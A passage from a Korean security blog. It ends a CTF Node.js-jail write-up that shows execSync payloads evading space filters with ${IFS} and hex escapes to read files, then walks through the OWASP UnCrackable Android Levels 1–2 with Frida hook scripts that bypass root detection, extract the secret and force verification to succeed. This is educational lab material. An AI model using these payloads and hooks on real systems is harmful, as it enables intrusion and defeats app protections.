것을 확인할 수 있습니다.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`c?t<span class="subst">$&#123;IFS&#125;</span>~~`</span>).toString()</span><br></pre></td></tr></table></figure><p>대회 당시에는 위와 같이 ${IFS}를 이용해서 공백을 우회하는 방식을 이용해서 진행하고 있었습니다. 하지만 위와 같이 아무리 해봐도 <code>err</code>만 반환할 분 아무 일도 일어나지 않아 그냥 포기 했었습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure><p>대회가 끝나고 승주님에게 물어보니 <code>fs</code> 모듈을 이용해서 디텍터리 탐색을 하는 코드를 받을 수 있었다. 위 코드를 보고 한 참 어이가 없었다. <code>fs</code>를 모듈을 이용해서 파일을 읽고, 쓰고만 되는 줄 알았는데 알고 보니 디렉터리를 탐색할 수 있다는 것을 처음 알았기 때문이다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure><p>그리고 두 번째는 경준님은 어케 풀었나 궁금해서 물어보니 위와 같이 위와 같이 16진수를 이용해서 공백을 우회한 것을 보고, 또 어이가 없었다..</p><blockquote><p>TRUST{th1s_1s_3xtrem3_n0d3_j41l}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> ReDos </tag>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UnCrackable Wrtie Up</title>
      <link href="2021/02/25/2021-02-25-UnCrackable/"/>
      <url>2021/02/25/2021-02-25-UnCrackable/</url>
      
        <content type="html"><![CDATA[<h2 id="UnCrackable-Level-1"><a href="#UnCrackable-Level-1" class="headerlink" title=" UnCrackable Level 1"></a><span style="color:#21C587"></span> UnCrackable Level 1</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level1/1.png?raw=true"></p><p>앱을 실행하면 루팅 탐지가 되었다는 팝업이 뜨는 것을 볼 수 있습니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        AlertDialog create = <span class="keyword">new</span> AlertDialog.Builder(<span class="keyword">this</span>).create();</span><br><span class="line">        create.setTitle(str);</span><br><span class="line">        create.setMessage(<span class="string">&quot;This is unacceptable. The app is now going to exit.&quot;</span>);</span><br><span class="line">        create.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class sg.vantagepoint.uncrackable1.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        create.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">        create.show();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    (생략)</span><br></pre></td></tr></table></figure><p>루팅 탐지 로직의 코드를 확인해보니 <code>MainActivity</code>에 있는 것을 볼 수 있고, <code>onClick()</code> 메서드를 이용해서 버튼을 클릭하면 <code>exit()</code> 메서드를 호출하는 것을 볼 수 있습니다. 그렇기 때문에 <code>OK</code> 버튼을 누르면 <code>exit()</code> 메서드에 의해서 프로그램이 종료가 되는 것 입니다. 일단 <code>onClick()</code> 메서드를 후킹해서 우회를 해보겠습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.choose(<span class="string">&quot;sg.vantagepoint.uncrackable1.MainActivity$1&quot;</span>,&#123;</span><br><span class="line">            onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">                a.onClick.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Root Detected Bypass&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Stage 1, Success&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>자바스크립트를 이용해서 위와 같이 익스 코드를 작성해주었습니다. <code>Java.choose()</code> 메서드를 이용해서 클래스를 불러와서 <code>onClick()</code> 메서드를 후킹해서 버튼을 클릭할 때 <code>exit()</code> 메서드가 아닌 <code>console.log()</code>가 실행이 되게 해주었습니다. 그리고 클래스를 불러올 때 <code>$1</code>를 붙혀주지 않으면 <code>onClick()</code> 메서드 후킹이 되지 않았습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;app&#x2F;UnCrackable&#x2F;Level1  frida -U -l exploit.js owasp.mstg.uncrackable1</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...                                                            </span><br><span class="line"></span><br><span class="line">[*] Stage 1, Success</span><br><span class="line">[SM-G965N::owasp.mstg.uncrackable1]-&gt;  </span><br><span class="line">[*] Root Detected Bypass</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level1/2.png?raw=true"></p><p>함수 후킹을 해주고 버튼을 클릭해주니 루팅 탐지가 잘 우회된 것을 볼 수 있습니다. 이제 특정한 값을 입력해주면 문제가 풀리게 됩니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level1/3.png?raw=true"></p><p>아무 값이나 입력하고 보내주니 값이 틀렸다고, 다시 입력해주라는 팝업이 뜨는 것을 볼 수 있습니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    (생략)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">verify</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        String str;</span><br><span class="line">        String obj = ((EditText) findViewById(R.id.edit_text)).getText().toString();</span><br><span class="line">        AlertDialog create = <span class="keyword">new</span> AlertDialog.Builder(<span class="keyword">this</span>).create();</span><br><span class="line">        <span class="keyword">if</span> (a.a(obj)) &#123;</span><br><span class="line">            create.setTitle(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">            str = <span class="string">&quot;This is the correct secret.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            create.setTitle(<span class="string">&quot;Nope...&quot;</span>);</span><br><span class="line">            str = <span class="string">&quot;That&#x27;s not it. Try again.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        create.setMessage(str);</span><br><span class="line">        create.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class sg.vantagepoint.uncrackable1.MainActivity.AnonymousClass2 */</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">                dialogInterface.dismiss();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        create.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>검증하는 함수를 찾아보니 <code>MainActivity</code> 제일 밑에 있었습니다. 코드를 보면 입력값을 <code>obj</code> 변수에 넣고, a 클래스의 <code>a()</code> 메서드의 인자값으로 <code>obj</code> 변수를 넘겨주고 있고, <code>a()</code>의 값이 참이면 문제가 풀리고, 거짓이면 아까와 같이 틀렸다고 팝업이 뜨는 로직인 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bArr = sg.vantagepoint.a.a.a(b(<span class="string">&quot;8d127684cbc37c17616d806cf50473cc&quot;</span>), Base64.decode(<span class="string">&quot;5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=&quot;</span>, <span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;CodeCheck&quot;</span>, <span class="string">&quot;AES error:&quot;</span> + e.getMessage());</span><br><span class="line">            bArr = bArr2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.equals(<span class="keyword">new</span> String(bArr));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>그리고 위 코드가 a 클래스의 <code>a()</code> 메서드의 코드입니다. 코드를 보면 <code>sg.vantagepoint.a.a.a()</code> 메서드를 이용해서 특정한 값을 만들고, 만들어진 <code>bArr</code> 값과 우리가 입력한 값을 비교하는 것을 볼 수 있습니다. 이때 우리가 입력한 값과 위에서 만들어진 값이 동일하면 <code>true</code>를 반환해 문제가 풀리는 구조입니다.<br></p><p>이제 생각해 볼 수 있는 건 <code>a()</code> 메서드를 후킹해서 반환값을 항상 참을 만들거나, <code>a()</code> 메서드에서 <code>bArr</code>의 값을 만들 때 사용되는 <code>sg.vantagepoint.a.a.a()</code>의 값을 뽑는 방법이 있겠습니다. 일단 2가지 익스를 모두 해보겠습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.choose(<span class="string">&quot;sg.vantagepoint.uncrackable1.MainActivity$1&quot;</span>,&#123;</span><br><span class="line">            onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">                a.onClick.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Root Detected Bypass&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Stage 1, Success&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sollution 1</span></span><br><span class="line">        <span class="keyword">const</span> cls = Java.use(<span class="string">&quot;sg.vantagepoint.a.a&quot;</span>);</span><br><span class="line">        cls.a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> bytes = cls.a(a, b);</span><br><span class="line">            <span class="keyword">const</span> secret = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; ++i)&#123;</span><br><span class="line">                secret += (<span class="built_in">String</span>.fromCharCode(bytes[i] &amp; <span class="number">0xff</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Find Secret : &quot;</span> + secret);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Stage 2, Success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sollution 2</span></span><br><span class="line">        <span class="keyword">const</span> cls2 = Java.use(<span class="string">&quot;sg.vantagepoint.uncrackable1.a&quot;</span>);</span><br><span class="line">        cls2.a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Stage 2, Success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>자바스크립트를 이용해서 위와 같이 <code>Sollution 1/2</code>를 모두 작성해주었습니다. <code>Sollution 1</code>은 <code>bArr</code>의 값을 만드는 <code>sg.vantagepoint.a.a.a()</code> 메서드를 후킹해서 여기서 만들어지는 값을 그대로 뽑아오는 것 익스입니다. 뽑아 오는 데이터는 바이트 객체이므로 <code>new Buffer</code>를 이용해서 문자열로 변환해주려 했지만 잘 되지 않아서 <code>String.fromCharCode()</code> 메서드를 이용해서 바이트 값을 문자열로 변환시켜주었습니다.<br></p><p><code>Sollution 2</code>는 a 클래스의 <code>a()</code> 메서드를 후킹해서 어떤 값을 입력해도 항상 <code>true</code>를 반환하게 만들어주었습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;app&#x2F;UnCrackable&#x2F;Level1  frida -U -l exploit.js owasp.mstg.uncrackable1</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...                                                            </span><br><span class="line"></span><br><span class="line">[*] Stage 1, Success</span><br><span class="line">[SM-G965N::owasp.mstg.uncrackable1]-&gt;  </span><br><span class="line">[*] Find Secret : I want to believe</span><br><span class="line"></span><br><span class="line">[*] Stage 2, Success</span><br></pre></td></tr></table></figure><p><code>Sollution 1</code>을 이용해 후킹 해주니 Secret 값을 잘 뽑는 것을 볼 수 있습니다. Secret 값은 <code>&quot;I want to believe&quot;</code>입니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level1/4.png?raw=true"></p><p><code>Sollution 2</code>를 이용해 함수를 후킹하고, 아무 값이나 입력해줘도 잘 풀리는 것을 볼 수 있습니다.</p><hr><h2 id="UnCrackable-Level-2"><a href="#UnCrackable-Level-2" class="headerlink" title=" UnCrackable Level 2"></a><span style="color:#21C587"></span> UnCrackable Level 2</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level2/1.png?raw=true"></p><p>앱을 실행하면 Level1과 마찬가지로 루팅 탐지가 되었다는 팝업이 뜨는 것을 볼 수 있습니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CodeCheck m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: private */</span></span><br><span class="line">    <span class="comment">/* access modifiers changed from: public */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        AlertDialog create = <span class="keyword">new</span> AlertDialog.Builder(<span class="keyword">this</span>).create();</span><br><span class="line">        create.setTitle(str);</span><br><span class="line">        create.setMessage(<span class="string">&quot;This is unacceptable. The app is now going to exit.&quot;</span>);</span><br><span class="line">        create.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class sg.vantagepoint.uncrackable2.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        create.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">        create.show();</span><br><span class="line">    &#125;</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>코드를 보면 일단 <code>System.loadLibrary()</code> 메서드를 이용해서 어떤 라이브러리를 불러오는 것을 볼 수 있습니다. 그리고 밑에서는 <code>onClick()</code> 메서드를 이용해서 버튼을 누르면 <code>System.exit()</code> 메서드를 호출하는 것을 볼 수 있습니다. 해당 로직도 Level1과 같이 <code>onClick()</code> 메서드를 후킹해주면 됩니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> cls = Java.use(<span class="string">&quot;sg.vantagepoint.uncrackable2.MainActivity$1&quot;</span>);</span><br><span class="line">        cls.onClick.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Root Detected Bypass&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;app&#x2F;UnCrackable&#x2F;Level2  frida -U -l exploit.js owasp.mstg.uncrackable2</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">                                                                                </span><br><span class="line">[SM-G965N::owasp.mstg.uncrackable2]-&gt;  </span><br><span class="line">[*] Root Detected Bypass</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level2/2.png?raw=true"></p><p>자바스크립트를 이용해서 위와 같이 루팅 탐지를 우회하는 익스 코드를 작성해서 후킹을 해주니 루팅 탐지를 잘 우회하는 것을 볼 수 있습니다. 이제 해야 할 건 Level1처럼 시크릿 키를 획득해서 입력해주면 되는 거 같습니다. 일단 verify 로직의 코드를 분석해보겠습니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">verify</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        String str;</span><br><span class="line">        String obj = ((EditText) findViewById(R.id.edit_text)).getText().toString();</span><br><span class="line">        AlertDialog create = <span class="keyword">new</span> AlertDialog.Builder(<span class="keyword">this</span>).create();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.m.a(obj)) &#123;</span><br><span class="line">            create.setTitle(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">            str = <span class="string">&quot;This is the correct secret.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            create.setTitle(<span class="string">&quot;Nope...&quot;</span>);</span><br><span class="line">            str = <span class="string">&quot;That&#x27;s not it. Try again.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        create.setMessage(str);</span><br><span class="line">        create.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class sg.vantagepoint.uncrackable2.MainActivity.AnonymousClass3 */</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">                dialogInterface.dismiss();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        create.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 코드 바로 위에 디버깅을 탐지하는 코드가 있는데 해당 부분은 문제 풀 때 필요가 없는 거 같아서 분석하지 않겠습니다. <code>verify()</code> 함수를 보면 입력값을 받아 와서 <code>obj</code> 변수에 넣어주고, <code>this.m.a()</code> 메서드에 <code>obj</code> 변수를 넘겨주고 있는 것을 볼 수 있습니다. 여기서 <code>this</code>는 현재 객체인 <code>MainActivity</code>를 가르키고, <code>m</code>은 아까 맨 위에서 <code>private CodeCheck m;</code>와 같이 <code>m</code>을 선언했기 때문에 <code>CodeCheck</code> 클래스를 가르키게 됩니다. 그럼 <code>CodeCheck</code> 클래스 내부에 있는 <code>a()</code> 메서드를 분석해보겠습니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sg.vantagepoint.uncrackable2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeCheck</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">bar</span><span class="params">(<span class="keyword">byte</span>[] bArr)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bar(str.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CodeCheck</code> 메서드를 